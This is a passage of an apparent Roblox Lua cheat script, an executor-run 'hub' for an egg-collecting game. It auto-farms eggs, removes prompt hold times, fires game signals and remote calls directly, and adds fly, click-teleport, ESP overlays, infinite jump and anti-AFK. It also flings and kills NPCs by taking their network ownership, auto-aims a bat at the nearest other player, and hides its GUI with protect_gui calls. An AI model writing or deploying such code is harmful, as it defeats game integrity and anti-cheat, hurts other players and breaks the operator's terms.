						pos3=slot.Position; cf3=slot.CFrame
					else
						for _, d in ipairs(slot:GetDescendants()) do
							if d:IsA("BasePart") then pos3=d.Position; cf3=d.CFrame; break end
						end
					end
					if not pos3 then return end
					local mutation2 = slot:GetAttribute("Mutation") or slot:GetAttribute("EggType")
					local rawText2, tags2, weight2 = _readEggLabels(slot)
					local cat2 = mutation2 or (tags2[1] and tags2[1]:upper()) or (zone.." Egg")
					_upsertEgg({
						slot=slot, pos=pos3, cf=cf3, area=zone,
						cat=cat2, mutation=mutation2 or tags2[1], tags=tags2,
						weight=weight2, rawText=rawText2,
						enabled=true, uid=sname, farmable=false,
					})
				end)
			end
		end
		pcall(function()
			for _, prompt in ipairs(workspace:GetDescendants()) do
				if prompt:IsA("ProximityPrompt") then
					local action = prompt.ActionText:lower()
					local objTxt = prompt.ObjectText:lower()
					local parentName = (prompt.Parent and prompt.Parent.Name or ""):lower()
					local isSellPrompt = action:find("sell",1,true) or objTxt:find("sell",1,true)
						or action:find("vend",1,true) or objTxt:find("vend",1,true)
					if not isSellPrompt and (action:find("grab") or action:find("steal") or action:find("take")
						or action:find("pick") or action:find("collect") or action:find("hatch")
						or action:find("claim") or action:find("harvest")
						or objTxt:find("egg") or parentName:find("egg") or parentName:find("drop")
						or parentName:find("field") or parentName:find("slot")) then
						local part, model = _promptOwnerModel(prompt)
						if part then
							local full, tags3, weight3 = _readEggLabels(model or part)
							local cat3 = (tags3[1] and tags3[1]:upper())
								or (objTxt ~= "" and prompt.ObjectText) or part.Name
							_upsertEgg({
								prompt=prompt, part=part, pos=part.Position, cf=part.CFrame,
								area="Dropped", cat=cat3,
								mutation=tags3[1], tags=tags3, weight=weight3, rawText=full,
								enabled=prompt.Enabled, farmable=true,
							})
						end
					end
				end
			end
		end)
		do
			local knownSlots = {}
			for _, r in ipairs(eggs) do
				if r.slot and r.area and r.area ~= "?" then
					knownSlots[#knownSlots+1] = r
				end
			end
			if #knownSlots > 0 then
				for _, r in ipairs(eggs) do
					if r.area == "?" then
						local bestZone, bestD = "?", math.huge
						for _, s in ipairs(knownSlots) do
							local d = (r.pos - s.pos).Magnitude
							if d < bestD then bestD = d; bestZone = s.area end
						end
						r.area = bestZone
					end
				end
			end
		end
		cachedEggs = eggs
		task.wait(0.5)
	end
end)

-- ============================================================
-- AUTOMATION FUNCTIONS  (assigned to _YE table for export)
-- ============================================================

-- Instant Grab
local _instaGrabConn = nil
local _instaGrabOriginal = setmetatable({}, {__mode = "k"})
local function _setInstantGrab(on)
	St.instantGrab = on
	if on then
		if _instaGrabConn then return end
		_instaGrabConn = ProximityPromptService.PromptShown:Connect(function(prompt)
			if not St.instantGrab then return end
			if _instaGrabOriginal[prompt] == nil then
				_instaGrabOriginal[prompt] = prompt.HoldDuration
			end
			prompt.HoldDuration = 0
		end)
	else
		if _instaGrabConn then _instaGrabConn:Disconnect(); _instaGrabConn = nil end
		for prompt, orig in pairs(_instaGrabOriginal) do
			pcall(function() if prompt and prompt.Parent then prompt.HoldDuration = orig end end)
		end
	end
end
_YE.setInstantGrab = _setInstantGrab

-- Auto Farm
_YE.farmFullStopRef = function() end
task.spawn(function()
	local isFarmingEgg = false
	local _farmMoving = false
	local _farmTargetPos = nil
	local function _farmFullStop()
		_farmMoving = false; _farmTargetPos = nil; isFarmingEgg = false
	end
	_YE.farmFullStopRef = _farmFullStop
	local _stealData = {}
	local _HOLD_DUR = 0.12
	local function _initStealData(prompt)
		if _stealData[prompt] then return end
		local d = {hold={}, trigger={}, useFallback=true}
		_stealData[prompt] = d
		pcall(function()
			if type(getconnections) ~= "function" then return end
			for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
				if c.Function then table.insert(d.hold, c.Function) end
			end
			for _, c in ipairs(getconnections(prompt.Triggered)) do
				if c.Function then table.insert(d.trigger, c.Function) end
			end
			if #d.hold > 0 or #d.trigger > 0 then d.useFallback = false end
		end)
	end
	local _canFireSignal = typeof(firesignal) == "function"
	local function _tryGrab(target)
		pcall(function()
			if target.prompt then
				if fireproximityprompt then pcall(fireproximityprompt, target.prompt) end
				if _canFireSignal then pcall(firesignal, target.prompt.Triggered, LP) end
				_initStealData(target.prompt)
				local sd = _stealData[target.prompt]
				if sd and not sd.useFallback then
					for _, f in ipairs(sd.hold) do task.spawn(f) end
					for _, f in ipairs(sd.trigger) do task.spawn(f) end
				else
					pcall(function()
						target.prompt:InputHoldBegin()
						task.wait(_HOLD_DUR)
						target.prompt:InputHoldEnd()
					end)
				end
			end
			if target.uid then _invokeRF("RF/EggWorld/AskFieldEggCarry", target.uid) end
			if target.part and fireclickdetector then
				for _, d2 in ipairs(target.part:GetChildren()) do
					if d2:IsA("ClickDetector") then pcall(fireclickdetector, d2) end
				end
			end
		end)
	end
	while true do
		task.wait(0.2)
		if not St.autoFarm then
			if isFarmingEgg or _farmMoving then _farmFullStop() end
		else
			local char = LP.Character
			local rootPart = char and char:FindFirstChild("HumanoidRootPart")
			if not isFarmingEgg and rootPart then
				local myPos = rootPart.Position
				local best, bestDist = nil, math.huge
				local fzLow = St.farmZone:lower()
				local function _zoneOk(area)
					if St.farmZone == "" then return true end
					if not area or area == "?" then return false end
					if area == St.farmZone then return true end
					local al = area:lower()
					return al:find(fzLow,1,true)~=nil or fzLow:find(al,1,true)~=nil
				end
				for _, r in ipairs(cachedEggs) do
					if r.enabled and r.farmable ~= false then
						if _zoneOk(r.area) then
							local d = (r.pos - myPos).Magnitude
							if d < bestDist then bestDist = d; best = r end
						end
					end
				end
				if best then
					isFarmingEgg = true; _farmMoving = true; _farmTargetPos = best.pos
					if best.uid then _fieldEggNet[best.uid] = nil end
					local spamming = true
					task.spawn(function()
						while spamming do _tryGrab(best); task.wait(0.2) end
					end)
					local t0 = os.clock()
					while St.autoFarm and _farmMoving and (os.clock()-t0) < 6 do
						local hrp2 = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
						if not hrp2 then break end
						if (hrp2.Position - best.pos).Magnitude < 4 then break end
						task.wait(0.1)
					end
					_farmMoving = false
					local t0b = os.clock()
					while St.autoFarm and (os.clock()-t0b) < 1.5 do task.wait(0.1) end
					spamming = false
					if St.autoFarm then
						local safePos = _findSafeZonePos()
						if safePos then
							_farmMoving = true; _farmTargetPos = safePos
							local t1 = os.clock()
							while St.autoFarm and _farmMoving and (os.clock()-t1) < 10 do
								local hrp4 = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
								if not hrp4 then break end
								if (hrp4.Position - safePos).Magnitude < 6 then break end
								task.wait(0.1)
							end
						end
					end
					_farmFullStop()
				end
			end
		end
	end
end)

-- Auto Hatch / Equip / Claim / Upgrade helpers
local function _clickGuiButtonByText(matchFn)
	local pg = LP:FindFirstChild("PlayerGui")
	if not pg then return false end
	local found = nil
	for _, d in ipairs(pg:GetDescendants()) do
		if (d:IsA("TextButton") or d:IsA("ImageButton")) and d.Visible then
			local txt = d:IsA("TextButton") and d.Text or nil
			if not txt then
				local tl = d:FindFirstChildWhichIsA("TextLabel", true)
				txt = tl and tl.Text or ""
			end
			if matchFn(txt or "") then found = d; break end
		end
	end
	if not found then return false end
	if typeof(firesignal) == "function" then
		local ok = pcall(function() firesignal(found.MouseButton1Click) end)
		if ok then return true end
	end
	return false
end
task.spawn(function()
	local last = 0
	while true do
		task.wait(1)
		if St.autoHatch and (os.clock()-last) >= 3 then
			last = os.clock()
			_clickGuiButtonByText(function(t) return t:lower():find("grow all",1,true)~=nil end)
		end
	end
end)
task.spawn(function()
	local last = 0
	while true do
		task.wait(2)
		if St.autoEquip and (os.clock()-last) >= 4 then
			last = os.clock()
			_clickGuiButtonByText(function(t) return t:lower():find("equip best",1,true)~=nil end)
		end
	end
end)
task.spawn(function()
	local last = 0
	while true do
		task.wait(1)
		if St.autoClaim and (os.clock()-last) >= 5 then
			last = os.clock()
			_invokeRF("RF/AwayEarnings/AskCollect")
			_invokeRF("RF/Codex/AskRedeemAll")
			_invokeRF("RF/GroupPerk/RedeemPerk")
		end
	end
end)
task.spawn(function()
	local last = 0
	while true do
		task.wait(1.5)
		if St.autoUpgradePen and (os.clock()-last) >= 2 then
			last = os.clock()
			local ok, data = pcall(function() return _M.Save and _M.Save.Get and _M.Save.Get() end)
			if ok and data then
				local nextLevel = (data.BaseUpgradeLevel or 0) + 1
				local nextConfig = _M.Bases and _M.Bases.BASES and _M.Bases.BASES[nextLevel]
				if nextConfig and data.Money and data.Money >= (nextConfig.Cost or math.huge) then
					_invokeRF("AskBaseTierRaise")
				end
			end
		end
	end
end)
task.spawn(function()
	local last = 0
	while true do
		task.wait(1.5)
		if St.autoUpgradeTM and (os.clock()-last) >= 2 then
			last = os.clock()
			local ok, data = pcall(function() return _M.Save and _M.Save.Get and _M.Save.Get() end)
			if ok and data then
				local nextLevel = (data.TreadmillUpgradeLevel or 0) + 1
				local nextConfig = _M.Treadmills and _M.Treadmills.GetByUpgradeLevel and _M.Treadmills.GetByUpgradeLevel(nextLevel)
				if nextConfig and data.Money and data.Money >= (nextConfig.Price or math.huge) then
					_invokeRF("AskTierRaise", nextConfig._id)
				end
			end
		end
	end
end)
task.spawn(function()
	while true do
		if St.autoRunTreadmill then _invokeRF("RF/Treadmill/AskSlowToggleSet", false) end
		task.wait(10)
	end
end)

-- Fly
local _flyConn, _flyBP = nil, nil
local function _stopFly()
	if _flyConn then _flyConn:Disconnect(); _flyConn = nil end
	pcall(function() if _flyBP then _flyBP:Destroy(); _flyBP = nil end end)
	local char = LP.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if hum then hum.PlatformStand = false end
end
local function _startFly()
	_stopFly()
	local char = LP.Character; if not char then return end
	local hrp = char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
	local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
	hum.PlatformStand = true
	_flyBP = Instance.new("BodyPosition")
	_flyBP.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	_flyBP.P = 1e4; _flyBP.D = 500
	_flyBP.Position = hrp.Position; _flyBP.Parent = hrp
	local bv = Instance.new("BodyVelocity")
	bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	bv.Velocity = Vector3.zero; bv.Parent = hrp
	_flyConn = RunService.RenderStepped:Connect(function()
		if not St.fly then return end
		local cam = workspace.CurrentCamera
		local mv = Vector3.zero
		if UIS:IsKeyDown(Enum.KeyCode.W) or UIS:IsKeyDown(Enum.KeyCode.Up) then mv = mv + cam.CFrame.LookVector end
		if UIS:IsKeyDown(Enum.KeyCode.S) or UIS:IsKeyDown(Enum.KeyCode.Down) then mv = mv - cam.CFrame.LookVector end
		if UIS:IsKeyDown(Enum.KeyCode.A) or UIS:IsKeyDown(Enum.KeyCode.Left) then mv = mv - cam.CFrame.RightVector end
		if UIS:IsKeyDown(Enum.KeyCode.D) or UIS:IsKeyDown(Enum.KeyCode.Right) then mv = mv + cam.CFrame.RightVector end
		if UIS:IsKeyDown(Enum.KeyCode.Space) then mv = mv + Vector3.new(0,1,0) end
		if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then mv = mv - Vector3.new(0,1,0) end
		bv.Velocity = mv.Magnitude > 0 and mv.Unit * St.flySpeed or Vector3.zero
		_flyBP.Position = hrp.Position
	end)
end
_YE.startFly = _startFly; _YE.stopFly = _stopFly

-- Anti Trap
local _trapConn, _lastTrapPos, _stuckSince = nil, Vector3.zero, 0
local function _stopAntiTrap() if _trapConn then _trapConn:Disconnect(); _trapConn = nil end end
local function _startAntiTrap()
	_stopAntiTrap()
	local _t = 0
	_trapConn = RunService.Heartbeat:Connect(function()
		if not St.antiTrap then return end
		local now = tick(); if now-_t < 0.5 then return end; _t = now
		local char = LP.Character
		local hrp = char and char:FindFirstChild("HumanoidRootPart")
		if not hrp then _lastTrapPos = Vector3.zero; _stuckSince = now; return end
		local moved = (hrp.Position - _lastTrapPos).Magnitude
		if moved < 0.5 then
			local hum = char:FindFirstChildOfClass("Humanoid")
			local isMoving = hum and hum.MoveDirection.Magnitude > 0.1
			if isMoving then
				if _stuckSince > 0 and now-_stuckSince > 1.5 then
					hrp.CFrame = hrp.CFrame * CFrame.new(0,3,0)
					_stuckSince = 0
				end
			else _stuckSince = 0 end
		else _stuckSince = 0 end
		_lastTrapPos = hrp.Position
	end)
end
_YE.startAntiTrap = _startAntiTrap; _YE.stopAntiTrap = _stopAntiTrap

-- Egg ESP
local _espParts = {}
local _espConn = nil
local function _clearESP()
	for _, p in ipairs(_espParts) do pcall(function() p:Destroy() end) end
	_espParts = {}
end
local function _stopESP()
	if _espConn then _espConn:Disconnect(); _espConn = nil end
	_clearESP()
end
local function _shortNum(n)
	if not n then return "?" end
	local a = math.abs(n)
	if a >= 1e6 then return string.format("%.1fM", n/1e6) end
	if a >= 1e3 then return string.format("%.1fK", n/1e3) end
	return string.format("%d", n)
end
local function _startESP()
	_stopESP()
	local _t = 0
	_espConn = RunService.Heartbeat:Connect(function()
		if not St.esp then return end
		local now = tick(); if now-_t < 1 then return end; _t = now
		_clearESP()
		local myPos = nil
		do
			local mc = LP.Character
			local mr = mc and mc:FindFirstChild("HumanoidRootPart")
			myPos = mr and mr.Position
		end
		local ESP_MAX_SHOWN, ESP_MAX_DIST = 20, 220
		local shown = {}
		if myPos then
			for _, r in ipairs(cachedEggs) do
				local d = (r.pos - myPos).Magnitude
				if d <= ESP_MAX_DIST then table.insert(shown, {r=r, d=d}) end
			end
			table.sort(shown, function(a,b) return a.d < b.d end)
		else
			for _, r in ipairs(cachedEggs) do shown[#shown+1] = {r=r, d=0} end
		end
		for i = 1, math.min(ESP_MAX_SHOWN, #shown) do
			local r = shown[i].r
			pcall(function()
				local unlocked = areaUnlocked(r.area)
				local hasRareTag = r.tags and #r.tags > 0
				local notReady = r.enabled == false
				local col = notReady and _YE_C.DIM or (not unlocked) and _YE_C.RED or (hasRareTag and _YE_C.GOLD or _YE_C.GREEN)
				local p = Instance.new("Part")
				p.Anchored = true; p.CanCollide = false; p.CanQuery = false; p.Transparency = 1
				p.Size = Vector3.new(3.5,3.5,3.5); p.CFrame = r.cf; p.Parent = workspace
				local bb = Instance.new("BillboardGui")
				bb.Size = UDim2.fromOffset(180,48); bb.AlwaysOnTop = true
				bb.MaxDistance = ESP_MAX_DIST; bb.Parent = p
				local nameLbl = Instance.new("TextLabel", bb)
				nameLbl.Size = UDim2.new(1,0,0,18); nameLbl.BackgroundTransparency = 1
				nameLbl.Font = Enum.Font.GothamBold; nameLbl.TextSize = 12
				nameLbl.TextStrokeTransparency = 0; nameLbl.TextColor3 = col
				nameLbl.Text = tostring(r.cat or "Egg"); nameLbl.TextTruncate = Enum.TextTruncate.AtEnd
				local detailLbl = Instance.new("TextLabel", bb)
				detailLbl.Size = UDim2.new(1,0,0,16); detailLbl.Position = UDim2.new(0,0,0,18)
				detailLbl.BackgroundTransparency = 1; detailLbl.Font = Enum.Font.GothamMedium
				detailLbl.TextSize = 10; detailLbl.TextStrokeTransparency = 0; detailLbl.TextColor3 = _YE_C.WHITE
				local metaLbl = Instance.new("TextLabel", bb)
				metaLbl.Size = UDim2.new(1,0,0,14); metaLbl.Position = UDim2.new(0,0,0,36)
				metaLbl.BackgroundTransparency = 1; metaLbl.Font = Enum.Font.Gotham
				metaLbl.TextSize = 9; metaLbl.TextStrokeTransparency = 0.1; metaLbl.TextColor3 = _YE_C.SILVER
				if notReady then
					detailLbl.Text = "GROWING"
				elseif not unlocked then
					local A2 = AREA[r.area]
					detailLbl.Text = "LOCKED ".._shortNum(A2 and A2.reqSP)
				else
					detailLbl.Text = "READY"
				end
				local metaParts = {}
				if r.weight then table.insert(metaParts, r.weight.."kg") end
				local distTxt = myPos and (math.floor((r.pos-myPos).Magnitude).."m") or "?m"
				table.insert(metaParts, distTxt); table.insert(metaParts, tostring(r.area or "?"))
				metaLbl.Text = table.concat(metaParts, "  *  ")
				table.insert(_espParts, p)
			end)
		end
	end)
end
_YE.startESP = _startESP; _YE.stopESP = _stopESP

-- FPS Boost
local function _applyFpsBoost()
	pcall(function() setfpscap(9999) end)
	local function proc(v)
		pcall(function()
			if v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") or v:IsA("ParticleEmitter")
				or v:IsA("Trail") or v:IsA("Beam") then v.Enabled = false
			elseif v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("SunRaysEffect")
				or v:IsA("DepthOfFieldEffect") then v:Destroy()
			elseif v:IsA("BasePart") then v.CastShadow = false end
		end)
	end
	for _, v in ipairs(workspace:GetDescendants()) do proc(v) end
	for _, v in ipairs(Lighting:GetDescendants()) do proc(v) end
	workspace.DescendantAdded:Connect(function(v) if St.fpsBoost then task.spawn(proc, v) end end)
end
_YE.applyFpsBoost = _applyFpsBoost

-- Anti AFK
local _afkConn = nil
local function _stopAntiAFK() if _afkConn then _afkConn:Disconnect(); _afkConn = nil end end
local function _startAntiAFK()
	_stopAntiAFK()
	local i = 0
	_afkConn = RunService.Heartbeat:Connect(function()
		if not St.antiAFK then return end
		i = i + 1
		if i % (30*60*15) == 0 then
			local char = LP.Character
			local hrp = char and char:FindFirstChild("HumanoidRootPart")
			if hrp then
				local cf = hrp.CFrame
				hrp.CFrame = cf * CFrame.new(0.01,0,0)
				task.wait(0.05)
				hrp.CFrame = cf
			end
			pcall(function()
				local VU = game:GetService("VirtualUser")
				VU:CaptureController(); VU:ClickButton2(Vector2.new())
			end)
		end
	end)
end
_YE.startAntiAFK = _startAntiAFK; _YE.stopAntiAFK = _stopAntiAFK

-- Infinite Jump
local _ijConn = nil
local function _startInfJump()
	if _ijConn then _ijConn:Disconnect() end
	_ijConn = UIS.JumpRequest:Connect(function()
		local char = LP.Character
		local hum = char and char:FindFirstChildOfClass("Humanoid")
		if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
	end)
end
local function _stopInfJump()
	if _ijConn then _ijConn:Disconnect(); _ijConn = nil end
end
_YE.startInfJump = _startInfJump; _YE.stopInfJump = _stopInfJump

-- Click TP
local _clickTpConn = nil
local function _stopClickTp() if _clickTpConn then _clickTpConn:Disconnect(); _clickTpConn = nil end end
local function _startClickTp()
	_stopClickTp()
	local mouse = LP:GetMouse()
	_clickTpConn = UIS.InputBegan:Connect(function(inp, gameProcessed)
		if gameProcessed or not St.clickTp then return end
		if inp.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
		local char = LP.Character
		local hrp = char and char:FindFirstChild("HumanoidRootPart")
		if not hrp then return end
		local target = mouse.Hit
		if not target then return end
		pcall(function() hrp.CFrame = CFrame.new(target.Position + Vector3.new(0,3,0)) * hrp.CFrame.Rotation end)
	end)
end
_YE.startClickTp = _startClickTp; _YE.stopClickTp = _stopClickTp

-- Fling
do
	local FLING_RADIUS = 25
	local FLING_FORCE  = 220
	local _flingConn   = nil
	local _flingHB     = 0
	local _flingScanT  = 0
	local _flingNpcs   = {}
	local _lpBumping   = false
	local function _isPlayerChar(model)
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr.Character == model then return true end
		end
		return false
	end
	local function _scanNpcs()
		local found = {}; local seen = {}
		for _, child in ipairs(workspace:GetChildren()) do
			local hum = child:FindFirstChildOfClass("Humanoid")
			local hrp = child:FindFirstChild("HumanoidRootPart")
			if hum and hrp and not _isPlayerChar(child) then
				seen[child] = true; found[#found+1] = {hrp=hrp, hum=hum, model=child}
			end
		end
		for _, desc in ipairs(workspace:GetDescendants()) do
			if desc:IsA("Humanoid") then
				local mdl = desc.Parent
				if mdl and not seen[mdl] and not _isPlayerChar(mdl) then
					local h = mdl:FindFirstChild("HumanoidRootPart")
					if h then seen[mdl] = true; found[#found+1] = {hrp=h, hum=desc, model=mdl} end
				end
			end
		end
		return found
	end
	local function _applyNpc(entry, myPos, myHRP)
		local hrp, hum, model = entry.hrp, entry.hum, entry.model
		if not (hrp and hrp.Parent) then return end
		local diff = hrp.Position - myPos
		local mag  = diff.Magnitude
		if mag >= FLING_RADIUS then return end
		local dir = mag > 0.1 and diff.Unit or Vector3.new(math.random()-0.5, 0.5, math.random()-0.5).Unit
		local outVel = dir * FLING_FORCE + Vector3.new(0, 50, 0)
		pcall(function()
			if setnworkowner then
				for _, p in ipairs(model:GetDescendants()) do
					if p:IsA("BasePart") then pcall(setnworkowner, p, LP) end
				end
				setnworkowner(hrp, LP)
			end
			hrp.AssemblyLinearVelocity = outVel
		end)
		pcall(function()
			local old = hrp:FindFirstChildOfClass("BodyVelocity")
			if old then old:Destroy() end
			local bv = Instance.new("BodyVelocity")
			bv.Velocity = outVel; bv.MaxForce = Vector3.new(1e9,1e9,1e9); bv.P = 1e6; bv.Parent = hrp
			task.delay(0.3, function() pcall(function() bv:Destroy() end) end)
		end)
		pcall(function()
			if not hum or not hum.Parent then return end
			if not entry.savedWS then entry.savedWS = hum.WalkSpeed; entry.savedJP = hum.JumpPower end
			hum.WalkSpeed = 0; hum.JumpPower = 0; hum.PlatformStand = true
			hum:ChangeState(Enum.HumanoidStateType.FallingDown)
		end)
		pcall(function() if hum and hum.Parent and hum.Health > 0 then hum.Health = 0 end end)
		pcall(function() hrp.CFrame = hrp.CFrame + dir * 25 end)
		if myHRP and not _lpBumping then
			_lpBumping = true
			pcall(function()
				local savedCF = myHRP.CFrame
				myHRP.AssemblyLinearVelocity = dir*(FLING_FORCE*1.5)+Vector3.new(0,25,0)
				task.delay(0.06, function()
					pcall(function() myHRP.CFrame = savedCF; myHRP.AssemblyLinearVelocity = Vector3.zero end)
					_lpBumping = false
				end)
			end)
		end
	end
	local function _restoreNpc(entry)
		pcall(function()
			local hum = entry.hum
			if not (hum and hum.Parent) then return end
			if entry.savedWS then hum.WalkSpeed = entry.savedWS end
			if entry.savedJP then hum.JumpPower = entry.savedJP end
			hum.PlatformStand = false
		end)
	end
	_YE.flingRunning = false
	_YE.startFling = function()
		if _flingConn then _flingConn:Disconnect(); _flingConn = nil end
		_YE.flingRunning = true; _flingHB = 0; _flingScanT = 0; _flingNpcs = {}; _lpBumping = false
		_flingConn = RunService.Heartbeat:Connect(function(dt)
			if not _YE.flingRunning then return end
			_flingScanT = _flingScanT + dt
			if _flingScanT >= 0.5 then
				_flingScanT = 0
				for _, e in ipairs(_flingNpcs) do
					if not (e.hrp and e.hrp.Parent) then _restoreNpc(e) end
				end
				_flingNpcs = _scanNpcs()
			end
			_flingHB = _flingHB + dt
			if _flingHB < 0.05 then return end; _flingHB = 0
			local myChar = LP.Character
			local myHRP  = myChar and myChar:FindFirstChild("HumanoidRootPart")
			if not myHRP then return end
			local myPos  = myHRP.Position
			for _, e in ipairs(_flingNpcs) do _applyNpc(e, myPos, myHRP) end
		end)
	end
	_YE.stopFling = function()
		_YE.flingRunning = false
		if _flingConn then _flingConn:Disconnect(); _flingConn = nil end
		for _, e in ipairs(_flingNpcs) do _restoreNpc(e) end
		_flingNpcs = {}; _lpBumping = false
	end
end

-- AimBat
local _aimBatActive = false
local _aimBatConn = nil
local _AB_HIT_CD = false
local _BAT_NAMES = {
	"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap",
	"Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap",
	"Galaxy Slap","Glitched Slap","FieldBat","Field Bat",
}
local function _isBatName(name)
	if not name then return false end
	for _, n in ipairs(_BAT_NAMES) do if name == n then return true end end
	local lower = name:lower()
	return lower:find("bat",1,true)~=nil or lower:find("slap",1,true)~=nil
end
local function _getBat()
	local char = LP.Character; if not char then return nil end
	local bp = LP:FindFirstChildOfClass("Backpack")
	for _, name in ipairs(_BAT_NAMES) do
		local t = char:FindFirstChild(name); if t and t:IsA("Tool") then return t end
		if bp then local t2 = bp:FindFirstChild(name); if t2 and t2:IsA("Tool") then return t2 end end
	end
	for _, t in ipairs(char:GetChildren()) do
		if t:IsA("Tool") and _isBatName(t.Name) then return t end
	end
	return nil
end
local function _stopAimBat()
	_aimBatActive = false
	if _aimBatConn then _aimBatConn:Disconnect(); _aimBatConn = nil end
	_AB_HIT_CD = false
	local char = LP.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if root then root.AssemblyLinearVelocity = Vector3.zero; root.AssemblyAngularVelocity = Vector3.zero end
	if hum then hum.AutoRotate = true end
end
local function _startAimBat()
	_aimBatActive = true
	if _aimBatConn then _aimBatConn:Disconnect() end
	local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
	if hum0 then hum0.AutoRotate = false end
	_aimBatConn = RunService.RenderStepped:Connect(function()
		if not _aimBatActive then return end
		local char = LP.Character; if not char then return end
		local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
		local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
		local equipped = char:FindFirstChildOfClass("Tool")
		if not (equipped and _isBatName(equipped.Name)) then
			local bat = _getBat()
			if bat then pcall(function() hum:EquipTool(bat) end) end
		end
		local closest, minDist = nil, math.huge
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr ~= LP and plr.Character then
				local tr = plr.Character:FindFirstChild("HumanoidRootPart")
				local hum2 = plr.Character:FindFirstChildOfClass("Humanoid")
				if tr and hum2 and hum2.Health > 0 then
					local d = (tr.Position - root.Position).Magnitude
					if d < minDist then minDist = d; closest = plr end
				end
			end
		end
		if not closest or not closest.Character then return end
		local tr = closest.Character:FindFirstChild("HumanoidRootPart"); if not tr then return end
		local targetVel = tr.AssemblyLinearVelocity
		local myPos, targetPos = root.Position, tr.Position
		local predictPos = targetPos + targetVel*0.14 + tr.CFrame.LookVector*0.3
		local direction = predictPos - myPos
		local flatDir = Vector3.new(direction.X,0,direction.Z).Unit
		local desiredHeight = targetPos.Y + 3.7
		local yVel = (desiredHeight - myPos.Y)*19.5 + targetVel.Y*0.8
		if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel,13) end
		yVel = math.clamp(yVel,-70,110)
		local desiredVel = Vector3.new(flatDir.X*State.normalSpeed, yVel, flatDir.Z*State.normalSpeed)
		root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)
		local speed3 = targetVel.Magnitude
		local predictTime = math.clamp(speed3/150, 0.05, 0.2)
		local predictedPos = targetPos + targetVel*predictTime
		local toPredict = predictedPos - myPos
		if toPredict.Magnitude > 0.1 then
			local goalCF = CFrame.lookAt(myPos, predictedPos)
			local diffCF = root.CFrame:Inverse() * goalCF
			local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
			rx = math.clamp(rx,-2.5,2.5); ry = math.clamp(ry,-2.5,2.5); rz = math.clamp(rz,-2.5,2.5)
			root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx*42,ry*42,rz*42))
		end
		if minDist <= 5 and not _AB_HIT_CD then
			_AB_HIT_CD = true
			pcall(function()
				local bat = _getBat()
				if bat then
					if bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end
					pcall(function() bat:Activate() end)
				end
			end)
			task.delay(0.2, function() _AB_HIT_CD = false end)
		end
	end)
end
_YE.startAimBat = _startAimBat; _YE.stopAimBat = _stopAimBat

-- Server Hop
local function _hopServer()
	local placeId = game.PlaceId
	local httpFn = nil
	if type(request) == "function" then httpFn = request
	elseif type(http_request) == "function" then httpFn = http_request
	elseif type(syn) == "table" and type(syn.request) == "function" then httpFn = syn.request end
	if not httpFn then
		pcall(function() game:GetService("TeleportService"):Teleport(placeId, LP) end)
		return
	end
	task.spawn(function()
		local candidates = {}
		pcall(function()
			local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100", placeId)
			local res = httpFn({Url = url, Method = "GET"})
			local body = res and (res.Body or res.body)
			if not body then return end
			local data = HttpService:JSONDecode(body)
			if data and data.data then
				for _, srv in ipairs(data.data) do
					if srv.id ~= game.JobId and srv.playing and srv.maxPlayers and srv.playing < srv.maxPlayers then
						table.insert(candidates, srv.id)
					end
				end
			end
		end)
		if #candidates > 0 then
			local pick = candidates[math.random(1, #candidates)]
			pcall(function() game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, pick, LP) end)
		else
			pcall(function() game:GetService("TeleportService"):Teleport(placeId, LP) end)
		end
	end)
end
_YE.hopServer = _hopServer

-- FOV watcher
task.spawn(function()
	local lastFov = St.fov
	while true do
		if St.fov ~= lastFov then
			lastFov = St.fov
			pcall(function() workspace.CurrentCamera.FieldOfView = St.fov end)
		end
		task.wait(0.1)
	end
end)

end)() -- end IIFE
-- ===================================================================
-- end yslemEgg GAME INFRASTRUCTURE
-- ===================================================================
local _MH_buildUI
_MH_buildUI = function()
local gui = Instance.new("ScreenGui")
gui.Name = _NS; gui.ResetOnSpawn = false; gui.DisplayOrder = 10
gui.IgnoreGuiInset = true; gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
table.insert(_themeAllGuis, gui)
pcall(function()
	if syn and syn.protect_gui then syn.protect_gui(gui) end
	if protectgui then protectgui(gui) end
end)
if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
	gui.Parent = (gethui and gethui()) or LP:WaitForChild("PlayerGui")
end
_G["_MH_GUI"] = gui

-- ===================================================================
-- INSTANT UI LOAD — quand activé, saute entièrement la cinématique
-- d'intro ci-dessous (~4.2s) : le hub est utilisable immédiatement au
-- chargement, sans aucune frame perdue à attendre l'animation. Activé
-- par défaut. Le bloc intro reste 100% intact plus bas, juste non
-- exécuté quand ce flag est vrai — zéro risque de casser l'animation
-- elle-même, aucune de ses variables locales n'est utilisée ailleurs
-- dans le fichier (bloc do..end totalement autonome, vérifié).
-- ===================================================================
local INSTANT_UI_LOAD = false

-- ===================================================================
-- [BUGFIX] "Skip Intro" PRELOAD — MH_load() (qui restaure _introEnabled
